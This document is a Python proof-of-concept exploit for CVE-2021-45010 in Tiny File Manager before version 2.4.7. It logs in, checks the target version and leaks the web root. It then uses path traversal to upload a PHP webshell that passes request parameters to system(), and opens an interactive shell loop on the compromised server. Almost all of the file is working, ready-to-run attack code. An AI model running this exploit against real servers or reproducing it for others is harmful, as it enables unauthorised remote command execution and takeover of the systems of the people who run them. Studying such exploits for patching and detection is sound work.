import argparse
import os.path
import random
import re
import requests
import rich
import rich.table
import string
import sys
from dataclasses import dataclass
from typing import Any, List, Optional, Tuple

from requests.cookies import RequestsCookieJar

ASCII_ART = """
 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗  ██╗      ██╗  ██╗███████╗ ██████╗  ██╗ ██████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗███║      ██║  ██║██╔════╝██╔═████╗███║██╔═████╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝╚██║█████╗███████║███████╗██║██╔██║╚██║██║██╔██║
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ██║╚════╝╚════██║╚════██║████╔╝██║ ██║████╔╝██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗ ██║           ██║███████║╚██████╔╝ ██║╚██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝ ╚═╝           ╚═╝╚══════╝ ╚═════╝  ╚═╝ ╚═════╝ 
                                                                                                      
PoC for [bold yellow]CVE-2021-45010[/bold yellow] - Tiny File Manager Version < [bold yellow]2.4.7[/bold yellow]
"""

LOGIN_TXT = "You are logged in"
VERSION_RE = re.compile("Tiny File Manager ([0-9.]+)")

PHP_WEBSHELL = "<?php system($_REQUEST['cmd']); ?>"

# ---------------------------------------------------------------------------------------------------------------------
def error(txt: str):
    rich.print(f"[red][-] Error: [/red]{txt}")
    sys.exit(1)

# ---------------------------------------------------------------------------------------------------------------------
def status(txt: str, prefix=""):
    rich.print(prefix + f"[blue][*][/blue] {txt}")

# ---------------------------------------------------------------------------------------------------------------------
def success(txt: str, prefix=""):
    rich.print(prefix + f"[green][+][/green] {txt}")

# ---------------------------------------------------------------------------------------------------------------------
def login(url: str, username: str, password: str) -> RequestsCookieJar:
    status("Attempting Login:")
    status(f"URL      : {url}", prefix="\t")
    status(f"Username : [bold cyan]{username}[/bold cyan]", prefix="\t")
    status(f"Password : [bold cyan]{password}[/bold cyan]", prefix="\t")
    post_data = {
        "fm_usr": username,
        "fm_pwd": password,
    }
    resp = requests.post(url=url, data=post_data, allow_redirects=False)
    
    if not resp.ok:
        error(f"[blue]{resp.status_code}[/blue] {resp.reason}")

    cookies = resp.cookies
    cookie = cookies.get("filemanager")
    if cookie is None:
       error("Failed to get session cookie") 
    success(f"Session Cookie 🍪: [bold green]{cookie}[/bold green]")

    resp = requests.get(url=url, cookies=cookies)

    if LOGIN_TXT in resp.text:
        success("Login Success!")
    else:
        error("Login Failed.")

    if not (match := VERSION_RE.search(resp.text)):
        error("Unable to locate Tiny File Manager version")
    
    version = str(match.groups(0)[0])
    
    try:
        (major, minor, revision) = tuple(int(x) for x in version.split("."))
        if major != 2 or minor > 4 or revision > 6:
            error(f"Version not vulnerable: [bold yellow]{version}[/bold yellow]")
        success(f"Vulnerable version detected: [bold green]{version}[/bold green]")
    except Exception:
        error(f"Failed to parse version: {version}")  

    return cookies

# ---------------------------------------------------------------------------------------------------------------------
def leak_webroot(url: str, cookies: RequestsCookieJar) -> str:
    status("Attempting to Leak Web Root...")
    post_data = {
        "type": "upload",
        "uploadurl": "http://totallyfakeurl",
        "ajax": True
    }
    leak_url = url + "?p=&upload"

    resp = requests.post(url=leak_url, data=post_data, cookies=cookies)    
    if not resp.ok:
        error(f"[blue]{resp.status_code}[/blue] {resp.reason}")

    try:
        webroot = os.path.split(resp.json()['fail']['file'])[0]
    except Exception:
        error("Failed to leak Web Root")

    success(f"Got Web Root: {webroot}", prefix="\t")
    return webroot

# ---------------------------------------------------------------------------------------------------------------------
def upload_webshell(url: str, path: str, cookies: RequestsCookieJar, gui_path: Optional[str]= None) -> str:
    filename = ''.join(random.choice(string.ascii_lowercase) for i in range(10)) + ".php"

    if gui_path is None:
        gui_path = ""
    elif gui_path.startswith("/"):
        gui_path = gui_path[1:]

    fullpath = f"../../../../../../../../../../..{path}{filename}"

    status("Attempting Webshell Upload:")
    status(f"Filename : {filename}")
    if gui_path == "":
        status(f"GUI Path  : <ROOT>")
    else:
        status(f"GUI Path  : {gui_path}")
    status(f"Filesystem Path  {fullpath}")

    form_data = {
        "p": (None, gui_path),
        "fullpath":(None, fullpath),
        "file": (filename, PHP_WEBSHELL)
    }
    resp = requests.post(url=url, files=form_data, cookies=cookies)    

    try:
        resp_json = resp.json()
        if resp_json['status'] == 'error':
            error(resp_json['info'])
    except Exception:
        error("Failed to parse response")

    success("Webshell Uploaded!")
    return filename

# ---------------------------------------------------------------------------------------------------------------------
def _shell_cmd(url: str, cookies: RequestsCookieJar,  cmd: str) -> str:
    resp = requests.get(url, params={"cmd": cmd}, cookies=cookies)
    
    if not resp.ok:
        error(f"Couldn't talk to webshell: [blue]{resp.status_code}[/blue] {resp.reason}")

    if resp.text.startswith("<!DOCTYPE html>"):

        error("Couldn't talk to webshell. Detected HTML Response")
    return resp.text

# ---------------------------------------------------------------------------------------------------------------------
def shell(url: str, cookies: RequestsCookieJar):
    status(f"Starting Webshell at: {url}")
    user = _shell_cmd(url, cookies, "id").strip()
    info = _shell_cmd(url, cookies, "uname -a").strip()

    success(f"Info: {info}", prefix="\t")
    success(f"User: {user}", prefix="\t")
    
    rich.print("\nType [bold cyan]quit[/bold cyan] to exit\n")
    while True:
        cmd = input("$> ")
        if cmd == "quit":
            break
        print(_shell_cmd(url, cookies, cmd))

# ---------------------------------------------------------------------------------------------------------------------
def cli():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help="Base URL")
    parser.add_argument('-l', "--username", required=True, help="Username")
    parser.add_argument('-p', "--password", required=True, help="Password")
    parser.add_argument('-g', "--gui-path", help="GUI relative path for upload (default: /)")
    parser.add_argument('-r', "--fs-relpath", help="Filesystem relative path (from web root) to write to", default="/")

    args = parser.parse_args()
    rich.print(ASCII_ART)

    cookies = login(args.url, args.username, args.password)
    webroot = leak_webroot(args.url, cookies)
    
    if args.fs_relpath is not None:
        webroot += f"/{args.fs_relpath}"

    filename = upload_webshell(args.url, webroot, cookies, gui_path=args.gui_path)
    web_path = args.url + args.fs_relpath + filename
    
    shell(web_path, cookies)


# ---------------------------------------------------------------------------------------------------------------------
if __name__ == '__main__':
    cli()
    